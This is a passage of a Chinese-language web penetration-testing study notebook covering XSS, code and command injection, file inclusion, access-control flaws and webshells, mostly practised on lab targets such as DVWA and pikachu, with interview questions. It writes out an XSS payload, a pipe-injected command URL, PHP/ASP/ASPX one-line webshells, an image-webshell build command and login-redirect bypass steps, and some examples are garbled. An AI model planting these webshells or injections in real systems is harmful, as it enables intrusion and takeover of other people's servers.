rel="noopener">XSS语句</a></p><p><a href="https://blog.csdn.net/weixin_30845171/article/details/98501929" target="_blank" rel="noopener">XSS 漏洞原理及防御方法</a></p><h4 id="↓↓↓↓搭建dvwa并演练↓↓↓↓"><a href="#↓↓↓↓搭建dvwa并演练↓↓↓↓" class="headerlink" title="↓↓↓↓搭建dvwa并演练↓↓↓↓"></a>↓↓↓↓搭建dvwa并演练↓↓↓↓</h4><h4 id="反射型："><a href="#反射型：" class="headerlink" title="反射型："></a>反射型：</h4><p>low：</p><pre><code>&lt;img src=x onerror=alert(1);&gt;</code></pre><h4 id="存储型："><a href="#存储型：" class="headerlink" title="存储型："></a>存储型：</h4><p>low：没意思</p><h4 id="Dom型："><a href="#Dom型：" class="headerlink" title="Dom型："></a>Dom型：</h4><p>在URL栏后面注入一个标签</p><h4 id="XSS进阶利用："><a href="#XSS进阶利用：" class="headerlink" title="XSS进阶利用："></a>XSS进阶利用：</h4><p><strong>BeFF原理：</strong>zombie（僵尸）即受害的浏览器。zombie是被hook（勾连）的，如果浏览器访问了有勾子（由js编写）的页面，就会被hook，勾连的浏览器会执行初始代码返回一些信息，接着zombie会每隔一段时间（默认为1秒）就会向BeEF服务器发送一个请求，询问是否有新的代码需要执行。BeEF服务器本质上就像一个Web应用，被分为前端UI，    和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示， BeEF持有者可以通过浏览器来登录BeEF  的后台管理UI。</p><p><a href="https://www.freebuf.com/articles/web/175755.html" target="_blank" rel="noopener"><strong>BeFF默认设置未同metasploit关联，无法使用msf模块，因此需要配置来连接msf</strong></a></p><p>这个服务极其NB！！！</p><p><a href="https://www.pianshen.com/article/42831378513/" target="_blank" rel="noopener">BeEF-XSS详细使用教程</a></p><h4 id="漏洞挖掘：-1"><a href="#漏洞挖掘：-1" class="headerlink" title="漏洞挖掘："></a>漏洞挖掘：</h4><p>见框就插：</p><p>搜索框、URL地址栏、留言板、登陆处、各种有输入输出点的地方</p><h4 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h4><p>白名单</p><p>输出检查</p><p>HTTPonly：浏览器进制页面的javascript访问带哦有HTTPonly属性的cookie。HTTPonly解决的是xss后的cookie劫持攻击</p><ul><li><h3 id="代码注入与命令注入"><a href="#代码注入与命令注入" class="headerlink" title="代码注入与命令注入"></a>代码注入与命令注入</h3></li></ul><h4 id="代码执行漏洞以及利用"><a href="#代码执行漏洞以及利用" class="headerlink" title="代码执行漏洞以及利用"></a>代码执行漏洞以及利用</h4><p><a href="https://www.jianshu.com/p/4aa5c0448e30" target="_blank" rel="noopener">代码执行漏洞相关函数</a></p><h5 id="静态函数执行："><a href="#静态函数执行：" class="headerlink" title="静态函数执行："></a>静态函数执行：</h5><p><a href="https://www.runoob.com/php/func-misc-eval.html" target="_blank" rel="noopener">eval()函数</a>把字符串当成 PHP 代码来计算</p><p><a href="https://www.runoob.com/w3cnote/c-assert.html" target="_blank" rel="noopener">assert()函数</a>会定期检查指定的断言并在结果为false时采取适当的行动</p><p>assert(‘phpinfo();’);</p><p>eval(‘phpinfo();’);</p><h5 id="动态函数执行："><a href="#动态函数执行：" class="headerlink" title="动态函数执行："></a>动态函数执行：</h5><pre><code>&lt;?php$name=$_GET[&#39;666&#39;];eval($name.&#39;;&#39;);</code></pre><h5 id="利用方式："><a href="#利用方式：" class="headerlink" title="利用方式："></a>利用方式：</h5><ul><li>获取绝对路径：</li></ul><pre><code>__FILE__是php预定义的常量，可以用来过去当前文件的绝对路径，?code=print(__FILE__)</code></pre><ul><li>文件读取：</li></ul><p>file_get_contents()函数用来读取服务器文件，？code=var_dump(file_get_contents(‘$_POST[‘filename]’,’$_POST[code]’));</p><ul><li>写入一句话木马：</li></ul><p>用file_get_contents()函数写入一句话木马前提是必须知道路径，？code=file_put_contents(‘c:\windows\win.ini’);</p><p>然后借助hackbar去提交filename=shell.php&amp;code=<?php eval($_POST['x'];?>借口在当前目录生成一句话木马。</p><h5 id="修复建议："><a href="#修复建议：" class="headerlink" title="修复建议："></a>修复建议：</h5><p>升级到PHP7.1</p><p>php.ini中关闭“allow_url_fopen”。在它打开的情况下，可以通过pher://等协议丢给include，让其执行动态代码。</p><p>永远不要在代码中使用eval。</p><p>严格进行过滤。</p><h4 id="命令执行漏洞以及利用"><a href="#命令执行漏洞以及利用" class="headerlink" title="命令执行漏洞以及利用"></a>命令执行漏洞以及利用</h4><h5 id="相关函数："><a href="#相关函数：" class="headerlink" title="相关函数："></a><a href="https://www.secpulse.com/archives/115318.html" target="_blank" rel="noopener">相关函数</a>：</h5><p>实例：</p><pre><code>&lt;?php$a=$_GET[&#39;ip&#39;];if($a){    system(&quot;ping -c 1 $a&quot;);}?&gt;</code></pre><p>payload：<a href="http://127.0.0.1/testphp/eval.php?ip=127.0.0.1|whoami" target="_blank" rel="noopener">http://127.0.0.1/testphp/eval.php?ip=127.0.0.1|whoami</a></p><p>其中的利用管道符号来实现在shell中的多重命令执行</p><h5 id="命令执行绕过："><a href="#命令执行绕过：" class="headerlink" title="命令执行绕过："></a><a href="http://www.ghtwf01.cn/index.php/archives/273/" target="_blank" rel="noopener">命令执行绕过：</a></h5><p>windows：</p><p>用^来转义&lt;&gt;</p><p>linux：</p><p>用\来转义&lt;&gt;</p><h4 id="dvwa靶场实战："><a href="#dvwa靶场实战：" class="headerlink" title="dvwa靶场实战："></a>dvwa靶场实战：</h4><p>impossible级别源码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string">'Submit'</span> <span class="token punctuation">]</span>  <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Check Anti-CSRF token</span>    <span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Get input</span>    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string">'ip'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Split the IP into 4 octects</span>    <span class="token variable">$octet</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span> <span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Check IF each octet is an integer</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token function">sizeof</span><span class="token punctuation">(</span> <span class="token variable">$octet</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// If all 4 octets are int's put the IP back together.</span>        <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">'.'</span> <span class="token punctuation">.</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">'.'</span> <span class="token punctuation">.</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">'.'</span> <span class="token punctuation">.</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Determine OS and execute the ping command.</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stristr</span><span class="token punctuation">(</span> <span class="token function">php_uname</span><span class="token punctuation">(</span> <span class="token string">'s'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'Windows NT'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Windows</span>            <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string">'ping  '</span> <span class="token punctuation">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// *nix</span>            <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string">'ping  -c 4 '</span> <span class="token punctuation">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Feedback for the end user</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>{$cmd}&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Ops. Let the user name theres a mistake</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;pre>ERROR: You have entered an invalid IP.&lt;/pre>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// Generate Anti-CSRF token</span><span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><h3 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3></li></ul><p>这是根据代码审计出来的，只能盲猜</p><p>魔术方法都是用__开头的：</p><p>__construct：构造函数，当对象创建（new）时会自动调用，unserialize反序列化时是不会被自动调用的</p><p>__destruct：析构函数，当对象被销毁时会自动调用。</p><p>__wakeup：</p><p>unserialize()时会检查是否存在__wakeup()，如果纯在，则会悠闲调用。</p><p>__sleep():用于提交未提交的数据，或蕾西的清理操作，因此当一个对象被序列化的时候被调用 </p><ul><li><h3 id="XXE外部实体注入"><a href="#XXE外部实体注入" class="headerlink" title="XXE外部实体注入"></a>XXE外部实体注入</h3><h4 id="熟悉XML定义："><a href="#熟悉XML定义：" class="headerlink" title="熟悉XML定义："></a>熟悉XML定义：</h4></li></ul><p><a href="https://blog.csdn.net/github_36086968/article/details/93044993" target="_blank" rel="noopener">XML定义，语法，解析学习</a></p><h4 id="理解DTD的作用："><a href="#理解DTD的作用：" class="headerlink" title="理解DTD的作用："></a>理解DTD的作用：</h4><h4 id="理解XXE原理："><a href="#理解XXE原理：" class="headerlink" title="理解XXE原理："></a>理解XXE原理：</h4><h4 id="掌握XXE利用方式："><a href="#掌握XXE利用方式：" class="headerlink" title="掌握XXE利用方式："></a>掌握XXE利用方式：</h4><ul><li><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3></li></ul><h4 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a><a href="https://blog.csdn.net/weixin_45116657/article/details/100602769" target="_blank" rel="noopener">漏洞产生原因</a></h4><h4 id="包含函数介绍："><a href="#包含函数介绍：" class="headerlink" title="包含函数介绍："></a>包含函数介绍：</h4><h5 id="include"><a href="#include" class="headerlink" title="include():"></a>include():</h5><p>当使用该函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</p><h5 id="include-once"><a href="#include-once" class="headerlink" title="include_once():"></a>include_once():</h5><p>功能和include()相同，区别在于当重复调用同一文件时，程序只调用一次。</p><h5 id="require"><a href="#require" class="headerlink" title="require():"></a>require():</h5><p>require()与include()的区别在于require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行。<br>使用require()函数包含文件时，只要程序一执行，立即调用文件，而include()只有程序执行到该函数时才调用。</p><h5 id="require-once"><a href="#require-once" class="headerlink" title="require_once():"></a>require_once():</h5><p>它的功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。</p><h5 id="利用copy合成一个一句话图片马-bat："><a href="#利用copy合成一个一句话图片马-bat：" class="headerlink" title="利用copy合成一个一句话图片马.bat："></a>利用copy合成一个一句话图片马.bat：</h5><p>copy 1.jpg/b + help.php/a help.jpg</p><ul><li><h3 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h3></li></ul><h4 id="业务接口调用"><a href="#业务接口调用" class="headerlink" title="业务接口调用"></a><a href="https://blog.csdn.net/fageweiketang/article/details/81668329" target="_blank" rel="noopener">业务接口调用</a></h4><h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><h4 id="越权漏洞：垂直、平行越权"><a href="#越权漏洞：垂直、平行越权" class="headerlink" title="越权漏洞：垂直、平行越权"></a>越权漏洞：垂直、平行越权</h4><h4 id="身份认证安全：session会话固定攻击、cookie仿冒"><a href="#身份认证安全：session会话固定攻击、cookie仿冒" class="headerlink" title="身份认证安全：session会话固定攻击、cookie仿冒"></a>身份认证安全：session会话固定攻击、cookie仿冒</h4><h4 id="密码找回安全"><a href="#密码找回安全" class="headerlink" title="密码找回安全"></a>密码找回安全</h4><h4 id="pikachu实战演练越权："><a href="#pikachu实战演练越权：" class="headerlink" title="pikachu实战演练越权："></a>pikachu实战演练越权：</h4><p>通过抓取lucy的个人信息，将其改为lili，既可以实现<strong>水平越权</strong></p><p>通过管理员的增加用户功能的URL，在登陆到pikaichu用户的情况下进行访问，就可以实现垂直越权</p><ul><li><h3 id="cors和jsonp跨域"><a href="#cors和jsonp跨域" class="headerlink" title="cors和jsonp跨域"></a>cors和jsonp跨域</h3></li></ul><h4 id="同源策略介绍："><a href="#同源策略介绍：" class="headerlink" title="同源策略介绍："></a><a href="https://blog.csdn.net/qq_36028303/article/details/80477193" target="_blank" rel="noopener">同源策略介绍</a>：</h4><p>相同的协议、相同的域名、相同的端口</p><ul><li><h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a><a href="https://segmentfault.com/a/1190000016026991" target="_blank" rel="noopener">解析漏洞</a></h3></li></ul><p><a href="https://blog.csdn.net/weixin_43625577/article/details/91971796" target="_blank" rel="noopener">常见的解析漏洞总结</a></p><ul><li><h3 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h3></li></ul><h4 id="IIS-PUT-漏洞："><a href="#IIS-PUT-漏洞：" class="headerlink" title="IIS PUT 漏洞："></a>IIS PUT 漏洞：</h4><p><a href="https://blog.csdn.net/XZ_______/article/details/111417967?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161759244516780264012132%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161759244516780264012132&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-4-111417967.first_rank_v2_pc_rank_v29&utm_term=IIS%2BPUT%2B%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">复现IIS PUT任意上传漏洞(过程，步骤，说明)</a>老漏洞了</p><h4 id="心脏滴血漏洞"><a href="#心脏滴血漏洞" class="headerlink" title="心脏滴血漏洞"></a><a href="https://blog.csdn.net/lixue20141529/article/details/77815979" target="_blank" rel="noopener">心脏滴血漏洞</a></h4><h4 id="任意文件读取与下载"><a href="#任意文件读取与下载" class="headerlink" title="任意文件读取与下载"></a><a href="https://blog.csdn.net/weixin_34281477/article/details/92134033" target="_blank" rel="noopener">任意文件读取与下载</a></h4><ul><li><h3 id="授权访问"><a href="#授权访问" class="headerlink" title="授权访问"></a>授权访问</h3></li></ul><h4 id="1-未授权访问漏洞介绍"><a href="#1-未授权访问漏洞介绍" class="headerlink" title="1.未授权访问漏洞介绍"></a>1.未授权访问漏洞介绍</h4><p><a href="https://blog.csdn.net/weixin_45439698/article/details/97672717?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161760573516780269840135%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161760573516780269840135&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-97672717.first_rank_v2_pc_rank_v29&utm_term=%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE" target="_blank" rel="noopener">未授权访问漏洞总结</a></p><h4 id="2-web端未授权访问："><a href="#2-web端未授权访问：" class="headerlink" title="2.web端未授权访问："></a>2.web端未授权访问：</h4><p>案例一：返回包改状态码与删除重定向字段（在面对一闪而过的重定向的页面时）</p><p>步骤一：URL输入 /admin/main.php抓包</p><p>步骤二：状态码302改为200，删除重定向location字段</p><p>目的：直接访问后台文件系统会判断是否登录，未登录会跳转到登录页面，所以我们要删除跳转内容，留在后台界面，进行操作。</p><p>或者找到跳转标签将其删除掉：&lt;meta(案例二)</p><p>步骤三：然后我们就可以在后台增删改查内容</p><p>案例三：js拦截 </p><p>针对弹窗拦截就是js拦截，删除跳转js标签</p><p><a href="https://blog.csdn.net/qq_41679358/article/details/108227070?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161760599716780255257025%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161760599716780255257025&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-108227070.first_rank_v2_pc_rank_v29&utm_term=%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%A1%88%E4%BE%8B" target="_blank" rel="noopener">Redis未授权访问漏洞原理及复现</a></p><p><a href="https://blog.csdn.net/Aaron_Miller/article/details/107822500?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161761058516780269877015%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161761058516780269877015&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-107822500.first_rank_v2_pc_rank_v29&utm_term=rsync%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0" target="_blank" rel="noopener">rsync未授权访问漏洞原理及复现</a></p><ul><li><h3 id="文件上传-amp-编辑器"><a href="#文件上传-amp-编辑器" class="headerlink" title="文件上传&amp;编辑器"></a>文件上传&amp;编辑器</h3></li></ul><p>webshell是一种网站后门木马，也是一种网页版的命令解释器，通过HTTP(s)协议通信，并且继承了web用户的权限</p><h4 id="一句话木马："><a href="#一句话木马：" class="headerlink" title="一句话木马："></a><a href="https://blog.csdn.net/weixin_39190897/article/details/86772765?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161761382616780274188830%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161761382616780274188830&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-86772765.first_rank_v2_pc_rank_v29&utm_term=%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC" target="_blank" rel="noopener">一句话木马：</a></h4><pre><code>php的一句话木马： &lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;asp的一句话是：   &lt;%eval request (&quot;pass&quot;)%&gt;aspx的一句话是：  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</code></pre><p>php一句话木马中的@是为了不报错</p><p>dvwahigh等级的配合组合拳：结合文件包含漏洞来触发上传的图片的马</p><p>针对于前端的绕过可以直接删掉js代码</p><ul><li><h3 id="APP测试"><a href="#APP测试" class="headerlink" title="APP测试"></a>APP测试</h3></li><li><h3 id="AWVS、Nessus"><a href="#AWVS、Nessus" class="headerlink" title="AWVS、Nessus"></a>AWVS、Nessus</h3></li><li><h3 id="MSF和永恒之蓝"><a href="#MSF和永恒之蓝" class="headerlink" title="MSF和永恒之蓝"></a>MSF和永恒之蓝</h3></li><li><h3 id="常见CMS漏洞复现"><a href="#常见CMS漏洞复现" class="headerlink" title="常见CMS漏洞复现"></a>常见CMS漏洞复现</h3></li><li><h3 id="框架和中间件漏洞"><a href="#框架和中间件漏洞" class="headerlink" title="框架和中间件漏洞"></a>框架和中间件漏洞</h3></li></ul><h2 id="3-后渗透篇"><a href="#3-后渗透篇" class="headerlink" title="3.后渗透篇"></a>3.后渗透篇</h2><ul><li><h3 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h3></li><li><h3 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h3></li><li><h3 id="流量映射端口反弹"><a href="#流量映射端口反弹" class="headerlink" title="流量映射端口反弹"></a>流量映射端口反弹</h3></li><li><h3 id="Windows权限维持"><a href="#Windows权限维持" class="headerlink" title="Windows权限维持"></a>Windows权限维持</h3></li><li><h3 id="Linux权限维持"><a href="#Linux权限维持" class="headerlink" title="Linux权限维持"></a>Linux权限维持</h3></li><li><h3 id="渗透的本质"><a href="#渗透的本质" class="headerlink" title="渗透的本质"></a>渗透的本质</h3></li><li><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4></li><li><h3 id="反弹shell方法汇总"><a href="#反弹shell方法汇总" class="headerlink" title="反弹shell方法汇总"></a>反弹shell方法汇总</h3></li><li><h3 id="Windows权限分析"><a href="#Windows权限分析" class="headerlink" title="Windows权限分析"></a>Windows权限分析</h3></li><li><h3 id="Windows-bypassUAC"><a href="#Windows-bypassUAC" class="headerlink" title="Windows bypassUAC"></a>Windows bypassUAC</h3></li><li><h3 id="Windows本地侦查"><a href="#Windows本地侦查" class="headerlink" title="Windows本地侦查"></a>Windows本地侦查</h3></li><li><h3 id="Windows内核提权"><a href="#Windows内核提权" class="headerlink" title="Windows内核提权"></a>Windows内核提权</h3></li><li><h3 id="Windows提权-1"><a href="#Windows提权-1" class="headerlink" title="Windows提权"></a>Windows提权</h3></li><li><h3 id="Linux提权-1"><a href="#Linux提权-1" class="headerlink" title="Linux提权"></a>Linux提权</h3></li><li><h3 id="Metasploit基本使用"><a href="#Metasploit基本使用" class="headerlink" title="Metasploit基本使用"></a>Metasploit基本使用</h3></li><li><h3 id="Metasploit-linux以及windows木马控制"><a href="#Metasploit-linux以及windows木马控制" class="headerlink" title="Metasploit linux以及windows木马控制"></a>Metasploit linux以及windows木马控制</h3></li><li><h3 id="linux权限维持"><a href="#linux权限维持" class="headerlink" title="linux权限维持"></a>linux权限维持</h3></li><li><h3 id="Windows权限维持-1"><a href="#Windows权限维持-1" class="headerlink" title="Windows权限维持"></a>Windows权限维持</h3></li></ul><h2 id="4-Python"><a href="#4-Python" class="headerlink" title="4.Python"></a>4.Python</h2><ul><li><h3 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h3></li><li><h3 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h3></li><li><h3 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h3></li><li><h3 id="第四天"><a href="#第四天" class="headerlink" title="第四天"></a>第四天</h3></li><li><h3 id="第五天爬虫"><a href="#第五天爬虫" class="headerlink" title="第五天爬虫"></a>第五天爬虫</h3></li><li><h3 id="python编写phpstudy-poc"><a href="#python编写phpstudy-poc" class="headerlink" title="python编写phpstudy_poc"></a>python编写phpstudy_poc</h3></li><li><h3 id="渗透测试流程and报告编写"><a href="#渗透测试流程and报告编写" class="headerlink" title="渗透测试流程and报告编写"></a>渗透测试流程and报告编写</h3></li></ul><h2 id="5-SRC漏洞挖掘"><a href="#5-SRC漏洞挖掘" class="headerlink" title="5.SRC漏洞挖掘"></a>5.SRC漏洞挖掘</h2><ul><li><h3 id="SRC信息收集通关之路"><a href="#SRC信息收集通关之路" class="headerlink" title="SRC信息收集通关之路"></a>SRC信息收集通关之路</h3></li><li><h3 id="SRC业务漏洞分类挖掘"><a href="#SRC业务漏洞分类挖掘" class="headerlink" title="SRC业务漏洞分类挖掘"></a>SRC业务漏洞分类挖掘</h3></li></ul><h2 id="6-串讲"><a href="#6-串讲" class="headerlink" title="6.串讲"></a>6.串讲</h2><h3 id="2021-3-30："><a href="#2021-3-30：" class="headerlink" title="2021-3-30："></a>2021-3-30：</h3><h4 id="应急响应："><a href="#应急响应：" class="headerlink" title="应急响应："></a>应急响应：</h4><p><strong><a href="https://www.freebuf.com/column/178677.html" target="_blank" rel="noopener">【应急响应】windows入侵排查思路</a></strong></p><p><a href="https://blog.csdn.net/weixin_44840696/article/details/90142992?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161708352316780357270687%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161708352316780357270687&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~top_positive~default-1-90142992.nonecase&utm_term=%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94" target="_blank" rel="noopener"><strong>应急响应流程</strong></a></p><p><a href="https://github.com/Bypass007" target="_blank" rel="noopener">https://github.com/Bypass007</a></p><p><strong>sql注入原理：</strong>SQL注入是指Web应用程序对用户输入数据的合法性未进行判断、处理，前端传入的参数是攻击者可控的，并且参数被正常的带入到数据库查询，就导致了sql注入漏洞的出现</p><p><strong>xss原理</strong>：是WEB应用程序混淆了用户提交的数据和JS脚本的代码边界，导致浏览器把用户的输入当成了JS代码来执行。xss的攻击对象是浏览器一端的普通用户。</p><p><a href="https://www.freebuf.com/vuls/251028.html" target="_blank" rel="noopener"><strong>SQL注入WAF绕过</strong></a></p><h4 id="hfish蜜罐搭建："><a href="#hfish蜜罐搭建：" class="headerlink" title="hfish蜜罐搭建："></a>hfish蜜罐搭建：</h4><p><a href="https://github.com/secoba/HFish" target="_blank" rel="noopener">企业安全测试主动攻击型蜜罐钓鱼框架系统</a></p><p><a href="https://github.com/hacklcx/hfish/releases同上" target="_blank" rel="noopener">https://github.com/hacklcx/hfish/releases同上</a></p><h1 id="7-2021年HW面试遇到的问题"><a href="#7-2021年HW面试遇到的问题" class="headerlink" title="7.2021年HW面试遇到的问题"></a>7.2021年HW面试遇到的问题</h1><h2 id="3-27面试题目："><a href="#3-27面试题目：" class="headerlink" title="3.27面试题目："></a>3.27面试题目：</h2><p><strong>针对时间盲注你会采用什么函数：</strong>sleep函数 substr函数</p><p><strong>针对文件上传漏洞的过滤你会采取什么措施：</strong></p><p>前端：使用.jsp、.asp、.phtml等绕过</p><p><a href="https://blog.csdn.net/qq_39101049/article/details/89109456" target="_blank" rel="noopener">后端：</a></p><p><strong>SQL注入的原理：</strong>SQL注入是指Web应用程序对用户输入数据的合法性未进行判断、处理，前端传入的参数是攻击者可控的，并且参数被正常的带入到数据库查询，就导致了sql注入漏洞的出现</p><p><strong>SQL注入的分类：</strong>布尔盲注、报错型注入、字符型注入、数字型注入等。</p><p><strong>Xss漏洞的原理：</strong>未对用户输出的数据进行过滤检测或者过滤不完全 就输出到了 前端代码中 导致js代码执行 造成xss漏洞</p><p><strong>如果遇到攻击你会怎么做：</strong>先分析流量，在查看日志看一下攻击的IP地址，最后封禁该IP地址</p><h2 id="3-31面试题目："><a href="#3-31面试题目：" class="headerlink" 